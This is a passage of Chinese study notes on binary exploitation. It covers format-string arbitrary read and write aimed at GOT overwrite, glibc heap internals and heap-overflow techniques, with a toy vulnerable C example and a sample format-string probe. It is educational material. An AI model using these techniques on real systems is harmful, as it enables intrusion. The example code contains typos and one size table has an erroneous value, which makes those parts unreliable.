1</li>\n</ul>\n<p>读取栈上第100个dword数据</p>\n<p>$ python -c “print ‘%100$08x’” | ./print2<br> ffa3cad0</p>\n<p>通过$操作符读取任意地址数据！！！</p>\n<p><strong>写入数据</strong></p>\n<ul>\n<li><p>任意地址任意写</p>\n</li>\n<li><ul>\n<li>任意地址：$控制</li>\n<li>任意值：      %xd通过控制x改变输出的字符个数</li>\n</ul>\n</li>\n<li><p>getshell</p>\n</li>\n<li><ul>\n<li>任意地址任意写——&gt;getshell?</li>\n</ul>\n</li>\n<li><ul>\n<li>覆盖got表！！！</li>\n</ul>\n</li>\n</ul>\n<p><strong>AAR和AAW</strong></p>\n<ul>\n<li>AAR：任意地址读（arbitrary     address read）</li>\n<li>AAW：任意地址写（arbitrary     address write）</li>\n<li>能做到这两点就非常强了，重点是如何拿到shell</li>\n<li>Q：写哪些地址，写什么值进去，可以劫持控制流？</li>\n<li>A：GOT表</li>\n</ul>\n<p><strong>GOT表</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625200629787.png\" alt=\"image-20210625200629787\" style=\"zoom:50%;\" />\n\n<p><strong>防御</strong></p>\n<ul>\n<li><p>调用约定 </p>\n</li>\n<li><ul>\n<li>caller将所有参数放在栈上</li>\n<li>callee假设所有参数都在栈上</li>\n</ul>\n</li>\n<li><p>漏洞确实存在，假设caller传的参数和callee期望的参数个数不同</p>\n</li>\n<li><p>解决方案：在caller和callee之间做验证     </p>\n</li>\n<li><ul>\n<li><p>caller一共传了多少参数？ </p>\n</li>\n<li><ul>\n<li>编译器在编译阶段可以知道</li>\n</ul>\n</li>\n<li><p>callee使用了多少参数？ </p>\n</li>\n<li><ul>\n<li>仅在运行时方可知道</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"Glibc堆分配机制\"><a href=\"#Glibc堆分配机制\" class=\"headerlink\" title=\"Glibc堆分配机制\"></a><strong>Glibc堆分配机制</strong></h3><p><strong>堆的使用</strong></p>\n<table>\n<thead>\n<tr>\n<th><strong>分类</strong></th>\n<th><strong>函数</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>程序员应用</td>\n<td></td>\n</tr>\n<tr>\n<td>libc 函数</td>\n<td>malloc(),  realloc(), free(), brk(), mmap(), munmap()</td>\n</tr>\n<tr>\n<td>内核调用</td>\n<td>brk,  mmap, munmap</td>\n</tr>\n</tbody></table>\n<p><strong>Linux 进程布局</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625200833180.png\" alt=\"image-20210625200833180\" style=\"zoom:50%;\" />\n\n<p>没错！又是它o(<em>￣▽￣</em>)ブ！！！</p>\n<p><strong>堆 VS 栈</strong></p>\n<ul>\n<li><p>堆 </p>\n<ul>\n<li>动态分配 </li>\n<li>对象，大缓冲区，结构体… </li>\n</ul>\n</li>\n<li><p>更慢，手动 </p>\n</li>\n<li><ul>\n<li>malloc / calloc /      recalloc / free</li>\n<li>new / delete</li>\n</ul>\n</li>\n<li><p>栈</p>\n</li>\n<li><ul>\n<li>在编译阶段就固定的内存分配</li>\n<li>局部变量，返回地址，函数地址</li>\n</ul>\n</li>\n<li><p>快，自动</p>\n</li>\n<li><ul>\n<li>编译阶段就完成</li>\n<li>抽象出分配/取消分配的概念</li>\n</ul>\n</li>\n</ul>\n<p><strong>堆的实现</strong></p>\n<p>不同的堆实现</p>\n<ul>\n<li>dlmalloc</li>\n<li>ptmalloc (glibc)</li>\n<li>tcmalloc (Chrome,     replaced)</li>\n<li>jemalloc     (Firefox/Facebook)</li>\n<li>nedmalloc</li>\n<li>Hoard</li>\n</ul>\n<p><strong>glibc的堆实现</strong></p>\n<p>chunk<br> 堆的基本单位是一个一个chunk块，chunk的结构如下：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span> &#123;</span></span><br><span class=\"line\">    INTERNAL_SIZE_T    prev_size;     <span class=\"comment\">/* Size of previous chunk (if free).  */</span></span><br><span class=\"line\">    INTERNAL_SIZE_T    size;          <span class=\"comment\">/* Size in bytes, including overhead. */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">fd</span>;</span>          <span class=\"comment\">/* double links -- used only if free. */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">bk</span>;</span>                                                                           / * Only used <span class=\"keyword\">for</span> large blocks: pointer to next larger size.  */</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">fd_nextsize</span>;</span> <span class=\"comment\">/* double links -- used only if free. */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">bk_nextsize</span>;</span></span><br><span class=\"line\"> &#125;;</span><br></pre></td></tr></table></figure>\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625201205824.png\" alt=\"image-20210625201205824\" style=\"zoom:50%;\" />\n\n<p><strong>chunk size</strong></p>\n<p>为了执行效率，chunk的长度会进行对齐</p>\n<ul>\n<li>32bit： （x + 4）对齐到8</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th><strong>data size</strong></th>\n<th><strong>0 ~ 4</strong></th>\n<th><strong>5 ~ 12</strong></th>\n<th><strong>13 ~ 20</strong></th>\n<th><strong>…</strong></th>\n<th><strong>53 ~ 60</strong></th>\n<th><strong>61 ~ 68</strong></th>\n<th><strong>69 ~ 76</strong></th>\n<th><strong>77 ~ 84</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>chunk  size</td>\n<td>16</td>\n<td>16</td>\n<td>24</td>\n<td>…</td>\n<td>64</td>\n<td>72</td>\n<td>80</td>\n<td>88</td>\n</tr>\n</tbody></table>\n<ul>\n<li>64bit： （x + 4）对齐到16</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th><strong>data size</strong></th>\n<th><strong>0 ~ 8</strong></th>\n<th><strong>9 ~ 24</strong></th>\n<th><strong>25 ~ 40</strong></th>\n<th><strong>…</strong></th>\n<th><strong>105 ~ 120</strong></th>\n<th><strong>121 ~ 136</strong></th>\n<th><strong>137 ~ 152</strong></th>\n<th><strong>153 ~ 168</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>chunk  size</td>\n<td>32</td>\n<td>32</td>\n<td>24</td>\n<td>…</td>\n<td>64</td>\n<td>72</td>\n<td>80</td>\n<td>88</td>\n</tr>\n</tbody></table>\n<p><strong>In used chunk</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625201332771.png\" alt=\"image-20210625201332771\" style=\"zoom:50%;\" />\n\n<ul>\n<li>如果前面的chunk是使用状态，prev_size则属于前一个堆块。</li>\n<li>prev_in_use表明前一个堆块是否free状态（且不在fastbins内）</li>\n<li>is_mmaped说明内存来自于mmap()</li>\n<li>non_main_arena表明该堆块由非主线程分配</li>\n</ul>\n<p><strong>free chunk</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625202247694.png\" alt=\"image-20210625202247694\" style=\"zoom:50%;\" />\n\n<p>如果前面的chunk是空闲状态，prev_size则记录前面chunk的大小。</p>\n<p>下一个堆块的prev_size记录本堆块的大小。</p>\n<p>其中，size不同于pre_size的是，size中的低三位作为flag。</p>\n<ul>\n<li>最低位:前一个 chunk         是否正在使用</li>\n<li>倒数第二位:当前 chunk     是否是通过 mmap 方式产生的</li>\n<li>倒数第三位:这个 chunk     是否属于一个线程的 arena<br>需要注意的是，如果该free chunk落在fastbin中，这些数据将不会被设置。</li>\n</ul>\n<p><strong>chunk</strong></p>\n<ul>\n<li><p>正在被使用的chunk </p>\n</li>\n<li><ul>\n<li>被程序的数据指针指向</li>\n<li>长度是对于chunk本身是可知的</li>\n<li>free()因此得以工作</li>\n</ul>\n</li>\n<li><p>free状态的chunk </p>\n</li>\n<li><ul>\n<li>不再被程序指向</li>\n<li>稍后会被重复使用来回应内存分配</li>\n<li>需要有效的组织管理free  chunk以便于maclloc()来分配</li>\n<li>how？</li>\n</ul>\n</li>\n</ul>\n<p><strong>free chunks的组织管理</strong></p>\n<ul>\n<li><p>链表，通常的，一个链表拥有的chunk长度相同     </p>\n</li>\n<li><ul>\n<li>需要多个链表</li>\n<li>以管理不同长度的chunk</li>\n<li>单链表或双向链表</li>\n<li>链表被分组为几个BINs</li>\n<li>fastbins,unsorted_bin,smallbins,largebins</li>\n</ul>\n</li>\n</ul>\n<p><strong>Arena(32bit)</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203040407.png\" alt=\"image-20210625203040407\" style=\"zoom:50%;\" />\n\n<p><strong>Get Arena</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203114779.png\" alt=\"image-20210625203114779\" style=\"zoom:50%;\" />\n\n<p><strong>fastbin</strong></p>\n<p>管理16bytes-64bytes（64位下为32bytes~128bytes）的chunk的单向链表数据结构，由于需要加速程序执行速度的原因，linux对于fastbin的检查较为松散，因此利用起来也较为方便。</p>\n<ul>\n<li><p>单向链表 </p>\n</li>\n<li><ul>\n<li>特点：快</li>\n<li>释放后的chunk插入fastbin表头</li>\n<li>只使用fd指针，bk指针，pre_size,p bit无效</li>\n</ul>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203309172.png\" alt=\"image-20210625203309172\" style=\"zoom:50%;\" />\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203322743.png\" alt=\"image-20210625203322743\" style=\"zoom:40%;\" />\n\n<p><strong>unsorted_bin</strong></p>\n<ul>\n<li><p>malloc() </p>\n</li>\n<li><ul>\n<li><p>如果搜索到unsorted_bin，对它管理的chunk一一处理      </p>\n</li>\n<li><ul>\n<li>把chunk归放到small/large  bin（唯一增加small/large bin的地方）</li>\n<li>如果长度刚好满足要求，就返回chunk并结束搜索</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>free() </p>\n</li>\n<li><ul>\n<li><p>如果free的chunk不能放到fastbin，就放到unsorted_bin。</p>\n</li>\n<li><p>向前面的空闲的chunk合并 </p>\n</li>\n<li><ul>\n<li>通过检查p bit</li>\n</ul>\n</li>\n<li><p>向后面的空闲的chunk合并 </p>\n</li>\n<li><ul>\n<li>通过检查它后一个chunk p       bit</li>\n</ul>\n</li>\n<li><p>设置fd，bk指针，后一个chunk的prev_size,p  bit</p>\n</li>\n</ul>\n</li>\n</ul>\n<p><strong>Small-bins</strong></p>\n<p>small-bins特点：</p>\n<ul>\n<li><p>malloc() </p>\n</li>\n<li><ul>\n<li>如果找到对应长度的chunk，则直接返回</li>\n</ul>\n</li>\n<li><p>free() </p>\n</li>\n<li><ul>\n<li>不会直接把chunk放进small-bin</li>\n</ul>\n</li>\n<li><p>fd/bk被设置 </p>\n</li>\n<li><ul>\n<li>当chunk从unsorted_bin删除时。</li>\n</ul>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203558989.png\" alt=\"image-20210625203558989\" style=\"zoom:50%;\" />\n\n<p><strong>Large-bins</strong></p>\n<ul>\n<li><p>malloc() </p>\n</li>\n<li><ul>\n<li><p>如果large-bin被搜索到 </p>\n</li>\n<li><ul>\n<li>寻找满足要求的最小chunk</li>\n<li>或者分裂大chunk，一份返回给用户，一份加入到unsorted_bin</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>free() </p>\n</li>\n<li><ul>\n<li>不会直接放到large-bin</li>\n</ul>\n</li>\n<li><p>fd/bk, fd_nextsize/bk_nextsize 被设置 </p>\n</li>\n<li><ul>\n<li>当其从unsorted_bin删除时。</li>\n</ul>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203631401.png\" alt=\"image-20210625203631401\" style=\"zoom:50%;\" />\n\n<p><strong>top chunk</strong></p>\n<p>初次malloc()后，没有被分出去的堆。</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203756685.png\" alt=\"image-20210625203756685\" style=\"zoom:50%;\" />\n\n<p><strong>malloc过程</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203823867.png\" alt=\"image-20210625203823867\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>检查长度是否符合fastbin的范围，如果在其中找到，则     </p>\n</li>\n<li><ul>\n<li>将其从单链表删除</li>\n<li>更新fd指针</li>\n</ul>\n</li>\n<li><p>检查长度是否符合smallbins的范围，如果在其中找到，则     </p>\n</li>\n<li><ul>\n<li>从双向链表中删除</li>\n<li>更新fd/bk指针</li>\n</ul>\n</li>\n<li><p>如果尝试分配长度很大的chunk，不直接搜索large-bin，而是进行chunk整理     </p>\n</li>\n<li><ul>\n<li>把fastbin放到unsorted_bin中</li>\n<li>更新下一个chunk的prev_size和p      bit</li>\n<li>合并空闲堆快</li>\n</ul>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203848532.png\" alt=\"image-20210625203848532\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>在unsorted_bin中搜索 </p>\n</li>\n<li><ul>\n<li>如果last_reminder      cache足够大，就分一块出来</li>\n<li>如果找到合适大小的chunk就返回</li>\n<li>对于搜索的每个chunk，将其按照范围放进small/large      bins</li>\n</ul>\n</li>\n<li><p>更新fd/bk指针</p>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203902464.png\" alt=\"image-20210625203902464\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>在small/large中搜索 </p>\n</li>\n<li><ul>\n<li><p>在最小的非空small/large      bin中找到足够大的chunk </p>\n</li>\n<li><ul>\n<li>unlink，split</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203923167.png\" alt=\"image-20210625203923167\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>从TOP chunk中获取内存 </p>\n</li>\n<li><ul>\n<li>如果top      chunk足够大，就分一部分出来</li>\n<li>如果没有fastbin就从系统获取内存</li>\n<li>再次整理fastbin和unsorted_bin</li>\n</ul>\n</li>\n</ul>\n<p><strong>free</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203941475.png\" alt=\"image-20210625203941475\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>检查元数据的安全性 </p>\n</li>\n<li><ul>\n<li>e.g. :      ptr-&gt;fd-&gt;bk == ptr</li>\n</ul>\n</li>\n<li><p>如果大小在fastbin范围内就放到fastbin里面     </p>\n</li>\n<li><ul>\n<li>更新fastbin，fd</li>\n</ul>\n</li>\n<li><p>合并前一个free状态的chunk </p>\n</li>\n<li><ul>\n<li>unlink</li>\n</ul>\n</li>\n<li><p>合并后一个free状态的chunk </p>\n</li>\n<li><ul>\n<li>unlink，top</li>\n</ul>\n</li>\n</ul>\n<p><strong>unlink</strong></p>\n<ul>\n<li>从链表中删除结点，并更新BK/FD</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204020527.png\" alt=\"image-20210625204020527\" style=\"zoom:50%;\" />\n\n<p>#define unlink(p,BK,FD)<br> {<br>   FD = p -&gt; fd;<br>   BK = p -&gt; bk;<br>   FD -&gt; bk = BK;<br>   BK -&gt; fd = FD;<br> }</p>\n<p><strong>什么时候进行unlink</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204048786.png\" alt=\"image-20210625204048786\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>free chunk从双向链表中被取出     </p>\n</li>\n<li><ul>\n<li>一种情况：与它物理相邻的堆块合并</li>\n<li>另一种情况：回应系统的分配请求</li>\n</ul>\n</li>\n<li><p>如果空闲堆块被损害？</p>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204119490.png\" alt=\"image-20210625204119490\" style=\"zoom:50%;\" />\n\n<p><strong>当chunk被unlink时</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204132422.png\" alt=\"image-20210625204132422\" style=\"zoom:50%;\" />\n\n<p><strong>main_areana 地址</strong></p>\n<ul>\n<li>运行时libc基地址</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204159171.png\" alt=\"image-20210625204159171\" style=\"zoom:50%;\" />\n\n<p>编译时确定的main_arena的偏移</p>\n<p><img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204227122.png\" alt=\"image-20210625204227122\"></p>\n<p>运行时main_arena的地址</p>\n<p>0xf7e16000 + 0x001BA420= 0xf7fd0420</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204302602.png\" alt=\"image-20210625204302602\" style=\"zoom:50%;\" />\n\n<p><strong>main_arena内容</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204321373.png\" alt=\"image-20210625204321373\" style=\"zoom:50%;\" />\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204358309.png\" alt=\"image-20210625204358309\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>free()和malloc()依赖于元数据(chunk的头部信息)来     </p>\n</li>\n<li><ul>\n<li>遍历      bins/lists/chunks</li>\n<li>将内存返回给用户</li>\n</ul>\n</li>\n<li><p>但是这些元数据没有很好的保护 </p>\n</li>\n<li><ul>\n<li>堆溢出，use-after-free</li>\n</ul>\n</li>\n</ul>\n<p><strong>堆溢出利用</strong></p>\n<p><strong>Glibc：Chunk In Use</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204532029.png\" alt=\"image-20210625204532029\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>prev_size 区域 </p>\n</li>\n<li><ul>\n<li>属于前一个chunk</li>\n<li>如果前一个chunk是free状态（并且不在fastbin）就会被设置</li>\n</ul>\n</li>\n<li><p>prev_in_use </p>\n</li>\n<li><ul>\n<li>若前一个chunk是free状态（并且不在fastbin）则置0</li>\n</ul>\n</li>\n<li><p>is_mmaped </p>\n</li>\n<li><ul>\n<li>是否是通过mmap()产生的</li>\n</ul>\n</li>\n<li><p>non_main_arena</p>\n</li>\n</ul>\n<p><strong>Glibc:被释放的chunk</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204722491.png\" alt=\"image-20210625204722491\" style=\"zoom:50%;\" />\n\n<ul>\n<li>下一个chunk的prev_size 这个free chunk的长度</li>\n<li>下一个chunk的prev_in_use 为0</li>\n<li>但是 如果这个被释放的chunk在fastbin，这些东西就不会被设置</li>\n<li>这个 chunk 是否属于一个线程的     arena</li>\n</ul>\n<p><strong>堆溢出</strong></p>\n<ul>\n<li><p>基本上与栈溢出基本类似</p>\n</li>\n<li><p>栈溢出的目标 </p>\n</li>\n<li><ul>\n<li>返回地址</li>\n<li>保存在栈帧的指针</li>\n<li>局部函数变量</li>\n<li>异常句柄</li>\n<li>其他敏感数据</li>\n</ul>\n</li>\n<li><p>堆溢出的目标 </p>\n</li>\n<li><ul>\n<li>堆的元数据</li>\n<li>对象中的函数指针</li>\n<li>对象中的vtable指针</li>\n<li>其他敏感数据</li>\n</ul>\n</li>\n</ul>\n<p><strong>例子</strong></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\t<span class=\"function\">struct <span class=\"title\">toystr</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\"><span class=\"keyword\">void</span></span> (* message)(<span class=\"keyword\">char</span> *);</span><br><span class=\"line\">    <span class=\"keyword\">char</span> buffer[<span class=\"number\">20</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">\tcoolguy = <span class=\"built_in\">malloc</span>(<span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(struct toystr))</span><br><span class=\"line\">\tlameguy = <span class=\"built_in\">malloc</span>(<span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(struct toystr))</span><br><span class=\"line\">\tcoolguy -&gt; message = &amp;print_cool;</span><br><span class=\"line\">\tlameguy -&gt; message = &amp;print_meh;</span><br><span class=\"line\">\t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Input coolguy&#x27;s name:&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">fgets</span>(coolguy-&gt;fuffer,<span class=\"number\">200</span>,stdin);</span><br><span class=\"line\">\tcoolguy-&gt;buffer[<span class=\"built_in\">strcspn</span>(coolguy-&gt;buffer,<span class=\"string\">&quot;\\n&quot;</span>)] = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Input lameguy&#x27;s name:&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">fgets</span>(coolguy-&gt;fuffer,<span class=\"number\">200</span>,stdin);</span><br><span class=\"line\">\tcoolguy-&gt;buffer[<span class=\"built_in\">strcspn</span>(coolguy-&gt;buffer,<span class=\"string\">&quot;\\n&quot;</span>)] = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tcoolguy-&gt;<span class=\"built_in\">message</span>(coolguy-&gt;buffer);</span><br><span class=\"line\">\tlameguy-&gt;<span class=\"built_in\">message</span>(lameguy-&gt;buffer);</span><br></pre></td></tr></table></figure>\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205042187.png\" alt=\"image-20210625205042187\" style=\"zoom:50%;\" />\n\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">coolguy = <span class=\"built_in\">malloc</span>(<span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(struct toystr))</span><br><span class=\"line\">lameguy = <span class=\"built_in\">malloc</span>(<span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(struct toystr))</span><br><span class=\"line\">coolguy -&gt; message = &amp;print_cool;</span><br><span class=\"line\">lameguy -&gt; message = &amp;print_meh;</span><br><span class=\"line\"><span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Input coolguy&#x27;s name:&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">fgets</span>(coolguy-&gt;fuffer,<span class=\"number\">200</span>,stdin);</span><br><span class=\"line\">coolguy-&gt;buffer[<span class=\"built_in\">strcspn</span>(coolguy-&gt;buffer,<span class=\"string\">&quot;\\n&quot;</span>)] = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Input lameguy&#x27;s name:&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">fgets</span>(coolguy-&gt;fuffer,<span class=\"number\">200</span>,stdin);</span><br><span class=\"line\">coolguy-&gt;buffer[<span class=\"built_in\">strcspn</span>(coolguy-&gt;buffer,<span class=\"string\">&quot;\\n&quot;</span>)] = <span class=\"number\">0</span>;</span><br><span class=\"line\">coolguy-&gt;<span class=\"built_in\">message</span>(coolguy-&gt;buffer);</span><br><span class=\"line\">lameguy-&gt;<span class=\"built_in\">message</span>(lameguy-&gt;buffer);<span class=\"comment\">//&lt;--------被溢出覆盖的函数指针</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>堆溢出有什么其他的利用方法？ </p>\n</li>\n<li><ul>\n<li>对象中的函数指针</li>\n<li>管理堆的元数据</li>\n<li>VTable指针</li>\n</ul>\n</li>\n</ul>\n<p><strong>溢出一个正在被使用的chunk</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205135042.png\" alt=\"image-20210625205135042\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>溢出 p bit（prev_in_use） </p>\n</li>\n<li><ul>\n<li><p>从0改变成1 </p>\n</li>\n<li><ul>\n<li>当这个chunk被free，前一个chunk不会被合并</li>\n<li>note：只有被free的chunk比fast-bin-size大时才会发生合并操作</li>\n</ul>\n</li>\n<li><p>从1改变成0 </p>\n</li>\n<li><ul>\n<li>当这个chunk被free时，前一个chunk会被合并</li>\n<li>Q1:前一个”free”状态chunk的大小？</li>\n<li>Q2:什么时候会发生合并？</li>\n<li>如果合并的free       chunk接下来被分配给其他对象，那么两个不同的对象会共享同一段内存</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>溢出 N bit（non_main_arena） </p>\n</li>\n<li><ul>\n<li><p>从0改变成1 </p>\n</li>\n<li><ul>\n<li>会标志其为non_main_arena，切换arena</li>\n<li>当这个chunk被释放，将会被添加到fastbin或者unsorted_bin</li>\n<li>指向fastbin/unsorted_bin的指针会更新</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><strong>溢出一个free chunk</strong></p>\n<ul>\n<li><p>溢出 P bit     （prev_in_use） </p>\n</li>\n<li><ul>\n<li><p>从1改变成0 </p>\n</li>\n<li><ul>\n<li>Q1：如果被分配给对象，P bit会被堆管理器纠正吗？</li>\n<li>Q2:如果这个chunk被其他free chunk合并了呢？<br>e.g.：该free chunk之后的chunk被释放，其会尝试向前面的chunk合并，得到一个非预期大小的free chunk</li>\n<li>这个free       chunk可以在稍后分配新的对象，新的对象会和前面的chunk共享内存</li>\n<li>Q3:如果这个chunk在bins之间移动？</li>\n</ul>\n</li>\n<li><p>从0改变成1，前面的free      chunk将不会被合并</p>\n</li>\n<li><p>被释放的堆快由arena/fastbin追踪记录</p>\n</li>\n<li><p>被释放的堆快可以在稍后分配给新的对象，或者被新的free chunk合并，或者按照 fastbin-&gt;unsorted_bin-&gt;smallbin/largebin的顺序移动    </p>\n</li>\n</ul>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205424699.png\" alt=\"image-20210625205424699\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>溢出 size 区域 </p>\n</li>\n<li><ul>\n<li>如果该chunk被分配？</li>\n<li>如果该chunk被物理相邻的chunk合并？</li>\n<li>如果这个chunk在bins间移动？</li>\n</ul>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205445914.png\" alt=\"image-20210625205445914\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>溢出 fd/bk指针 </p>\n</li>\n<li><ul>\n<li>产生 unlink 问题</li>\n</ul>\n</li>\n<li><p>溢出 prev_size 区域 </p>\n</li>\n<li><ul>\n<li><p>如果缩小prev_size </p>\n</li>\n<li><ul>\n<li><p>当下一个chunk被释放时，会发生什么？       </p>\n</li>\n<li><ul>\n<li>会尝试合并当前chunk（的一部分）</li>\n<li>当前chunk（的一部分）将被unlink，导致unlink操作到假的fd/bk指针，并且当前        free chunk和合并的chunk重叠。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>如果放大prev_size </p>\n</li>\n<li><ul>\n<li><p>当下一个chunk被释放时，会发生什么？       </p>\n</li>\n<li><ul>\n<li>会尝试合并当前chunk（大于实际）</li>\n<li>（大于实际）的当前堆快将被unlink，导致unlink操作到假的fd/bk指针，并且前面（正在使用）的chunk会和新合并的free        chunk共享内存</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><strong>溢出TOP chunk的size区域</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205532518.png\" alt=\"image-20210625205532518\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>缩小size </p>\n</li>\n<li><ul>\n<li>浪费内存</li>\n</ul>\n</li>\n<li><p>放大size 